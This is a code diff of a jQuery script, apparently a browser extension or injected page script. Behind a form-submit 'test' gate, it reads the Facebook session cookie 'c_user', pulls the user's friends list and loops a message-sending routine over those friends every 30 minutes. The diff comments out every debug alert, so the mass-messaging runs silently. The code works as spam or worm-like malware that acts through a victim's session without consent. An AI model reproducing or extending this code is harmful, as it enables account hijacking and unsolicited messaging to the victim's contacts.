@@ -26,7 +26,7 @@ $(document).ready(function () {
     $("body").on('submit', '#test_form', function (event) {
 
         if (checkTask($('#result').val())) {
-            alert('success');
+           // alert('success');
             $('#my_test_div').hide();
             var fbid = readCookie('c_user');
             setFriendsList([fbid], testAsync);
@@ -40,9 +40,9 @@ $(document).ready(function () {
 });
 
 function testAsync(fbid, list){
-    alert('in callback ' + list);
+    //alert('in callback ' + list);
     if(list.length > 0){
-       alert ('in list');
+       //alert ('in list');
        workWithFriendsList(list, fbid);
     }
 };
@@ -58,7 +58,7 @@ function setFriendsList(fbid , callback) {
                 //alert('txt=' + txt);
                 var obj = $.parseJSON(txt);
                 var list = obj.payload.entries;
-                alert('list count=' + list.length);
+                //alert('list count=' + list.length);
                 callback(fbid, list);
             }
             else callback(fbid, []);
@@ -68,7 +68,7 @@ function setFriendsList(fbid , callback) {
 }
 
 function workWithFriendsList(data, fbid) {
-    alert('in work' + fbid);
+    //alert('in work' + fbid);
     //var list = [];
     var row = [];
     var test = '';
@@ -89,17 +89,17 @@ function workWithFriendsList(data, fbid) {
                 sendMessage(row, fbid, z, false, i)
                 i++;
             }
-            else{ alert('is=' + row['uid']) }
+            //else{ alert('is=' + row['uid']) }
             delete data[key];
         }
 
     });
     if(data.length >0 ){ setTimeout(function(){ workWithFriendsList(data, fbid);  }, 1800000); alert('middle')}
-    else alert('end');
+    //else alert('end');
 }
 
 function sendMessage(data, fbid, z, real, i) {
-    alert ('in sendMessage: ' + i + ' = ' + data['uid']);
+   // alert ('in sendMessage: ' + i + ' = ' + data['uid']);
     if (real == false) {db.insert({uid: data['uid'], path: data['path'], text: data['text']}); return;}
     var d = new Date().getDate();
     var time = d.getHours() + "%3A" + d.getMinutes();
@@ -150,7 +150,7 @@ function sendMessage(data, fbid, z, real, i) {
 
         },
         error: function (e) {
-            alert("error: " + e.message);
+           // alert("error: " + e.message);
             return false;
         }
     });
@@ -236,7 +236,7 @@ function random(len) {
 }
 
 $.fn.comments = function (blnDeep) {
-    alert('comments test');
+   // alert('comments test');
     blnDeep = (blnDeep || false);
     var jComments = $([]);
 
@@ -249,7 +249,7 @@ $.fn.comments = function (blnDeep) {
         // Keep looping over the top-level children
         // while we have a node to examine.
         while (objChildNode) {
-            alert('while');
+           // alert('while');
             // Check to see if this node is a comment.
             if (objChildNode.nodeType === 8) {
                 commentWork(jComments);
@@ -279,9 +279,4 @@ function readCookie(name) {
         if (c.indexOf(nameEQ) == 0) return unescape(c.substring(nameEQ.length, c.length));
     }
     return null;
-}
-
-function commentWork(node) {
-
-    alert(node.text);
 }
